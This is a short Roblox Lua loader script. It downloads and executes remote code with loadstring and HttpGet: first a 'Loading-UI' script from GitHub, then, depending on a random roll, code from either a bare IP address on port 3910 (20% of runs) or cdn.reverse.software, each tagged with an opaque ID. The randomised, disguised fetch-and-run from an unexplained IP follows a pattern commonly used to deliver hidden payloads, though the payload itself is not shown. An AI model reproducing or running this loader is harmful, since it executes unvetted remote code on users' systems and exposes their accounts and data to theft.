loadstring(game:HttpGet("https://raw.githubusercontent.com/Ilusion-scripts/Loading-UI/refs/heads/main/loading"))()


local chance = math.random(1, 100)

if chance <= 20 then
    ID="d98f46c5-df0d-4ba3-9db0-61244be7c8e6";
    loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))() 
else
    ID="e318daab-d077-4f00-ad68-98d4a9d95d3d"; loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
end
